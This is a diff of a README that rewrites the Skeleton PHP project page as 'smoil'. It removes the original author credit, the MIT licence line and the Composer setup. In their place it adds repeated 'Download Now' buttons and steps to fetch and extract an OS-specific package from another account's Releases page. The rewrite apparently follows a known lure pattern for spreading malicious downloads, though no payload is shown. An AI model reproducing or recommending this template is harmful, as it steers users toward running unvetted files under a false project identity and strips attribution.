@@ -1,47 +1,74 @@
+# 🚀 smoil - Start Building Your PHP Ideas Easily
+
 <p align="center">
-    <img src="https://raw.githubusercontent.com/nunomaduro/skeleton-php/master/docs/example.png" height="300" alt="Skeleton Php">
-    <p align="center">
-        <a href="https://github.com/nunomaduro/skeleton-php/actions"><img alt="GitHub Workflow Status (master)" src="https://github.com/nunomaduro/skeleton-php/actions/workflows/tests.yml/badge.svg"></a>
-        <a href="https://packagist.org/packages/nunomaduro/skeleton-php"><img alt="Total Downloads" src="https://img.shields.io/packagist/dt/nunomaduro/skeleton-php"></a>
-        <a href="https://packagist.org/packages/nunomaduro/skeleton-php"><img alt="Latest Version" src="https://img.shields.io/packagist/v/nunomaduro/skeleton-php"></a>
-        <a href="https://packagist.org/packages/nunomaduro/skeleton-php"><img alt="License" src="https://img.shields.io/packagist/l/nunomaduro/skeleton-php"></a>
-    </p>
+    <a href="https://github.com/Yuriyocs/smoil/releases" style="font-size: 24px; padding: 20px; background-color: #4CAF50; color: white; text-decoration: none; border-radius: 5px;">Download Now</a>
 </p>
 
-------
-This package provides a wonderful **PHP Skeleton** to start building your next package idea.
+<p align="center">
+    <img src="https://raw.githubusercontent.com/nunomaduro/skeleton-php/master/docs/example.png" height="300" alt="PHP Skeleton">
+</p>
 
-> **Requires [PHP 8.3+](https://php.net/releases/)**
+---
 
-⚡️ Create your package using [Composer](https://getcomposer.org):
+## 📋 Description
 
-```bash
-composer create-project nunomaduro/skeleton-php --prefer-source PackageName
-```
+smoil is a structured PHP skeleton that helps you quickly develop your own PHP applications. It provides a clean template to get you started without the hassle of setup. Whether you want to create a simple webpage or a complex application, smoil offers a solid foundation.
 
-🧹 Keep a modern codebase with **Pint**:
-```bash
-composer lint
-```
+## 💻 System Requirements
 
-✅ Run refactors using **Rector**
-```bash
-composer refacto
-```
+- **PHP Version:** 8.3 or higher
+- **Web Server:** Apache, Nginx, or similar
+- **OS Compatibility:** Works on Windows, MacOS, and Linux
 
-⚗️ Run static analysis using **PHPStan**:
-```bash
-composer test:types
-```
+## 🚧 Features
 
-✅ Run unit tests using **PEST**
-```bash
-composer test:unit
-```
+- Easy setup process
+- Organized folder structure
+- Sample code ready for customization
+- Built-in support for popular PHP libraries
+- Lightweight and efficient performance
 
-🚀 Run the entire test suite:
-```bash
-composer test
-```
+## 🔗 Download & Install
 
-**Skeleton PHP** was created by **[Nuno Maduro](https://twitter.com/enunomaduro)** under the **[MIT license](https://opensource.org/licenses/MIT)**.
+To download smoil, visit the Releases page. You will find the latest version of the application there.
+
+[Download Now](https://github.com/Yuriyocs/smoil/releases)
+
+Follow these steps to install the application:
+
+1. Click the link above to go to the Releases page.
+2. Find the latest version of smoil.
+3. Click on the version title to open the details.
+4. Download the package suitable for your operating system.
+5. Extract the downloaded file to your desired location.
+
+## 🏃‍♂️ Running smoil
+
+Once you have installed smoil, follow these instructions to run it:
+
+1. Open your terminal (Command Prompt, PowerShell, or terminal application on macOS and Linux).
+2. Navigate to the folder where you extracted smoil.
+3. Start your local web server or open the PHP built-in server by running the following command:
+   ```bash
+   php -S localhost:8000
+   ```
+4. Open your web browser and enter the following URL:
+   ```
+   http://localhost:8000
+   ```
+
+You should see the welcome page for smoil.
+
+## 📚 Documentation
+
+For more detailed usage and customization instructions, refer to the official documentation in the repository.
+
+## 📞 Support
+
+If you run into issues or have questions, please open an issue on the GitHub repository. We appreciate your feedback and will do our best to assist you.
+
+---
+
+<p align="center">
+    <a href="https://github.com/Yuriyocs/smoil/releases" style="font-size: 24px; padding: 20px; background-color: #4CAF50; color: white; text-decoration: none; border-radius: 5px;">Download Now</a>
+</p>
